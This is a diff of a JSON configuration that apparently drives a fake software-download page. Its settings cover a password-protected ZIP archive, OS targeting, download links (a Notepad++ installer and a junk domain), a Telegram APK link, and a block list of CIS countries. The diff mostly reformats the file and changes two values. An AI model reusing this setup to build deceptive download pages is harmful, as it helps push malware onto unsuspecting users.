@@ -1,1 +1,38 @@
-{"PageStatus":"ON","Archiving":{"Enabled":"ON","Password":"a123asdsa","SoftwareName":"notess","ZIPName":"notepads"},"GEO":["100"],"BlockedGEO":["AM","AZ","BY","KZ","KG","MD","RU","TJ","UZ"],"FileName":"","OS":["Windows","Android"],"PatchDownloadLinks":["https:\/\/github.com\/notepad-plus-plus\/notepad-plus-plus\/releases\/download\/v8.1.4\/npp.8.1.4.Installer.x64.exe","https:\/\/asdkjaskl.com"],"Version":{"Enabled":"V1"},"AndroidLink":"aaaaa","iOSLink":"","MacOSLink":""}
+{
+	"PageStatus": "ON",
+	"Archiving": {
+		"Enabled": "OFF",
+		"Password": "a123asdsa",
+		"SoftwareName": "notess",
+		"ZIPName": "notepads"
+	},
+	"GEO": [
+		"100"
+	],
+	"BlockedGEO": [
+		"AM",
+		"AZ",
+		"BY",
+		"KZ",
+		"KG",
+		"MD",
+		"RU",
+		"TJ",
+		"UZ"
+	],
+	"FileName": "",
+	"OS": [
+		"Windows",
+		"Android"
+	],
+	"PatchDownloadLinks": [
+		"https:\/\/github.com\/notepad-plus-plus\/notepad-plus-plus\/releases\/download\/v8.1.4\/npp.8.1.4.Installer.x64.exe",
+		"https:\/\/asdkjaskl.com"
+	],
+	"Version": {
+		"Enabled": "V1"
+	},
+	"AndroidLink": "https://telegram.org/dl/android/apk",
+	"iOSLink": "",
+	"MacOSLink": ""
+}
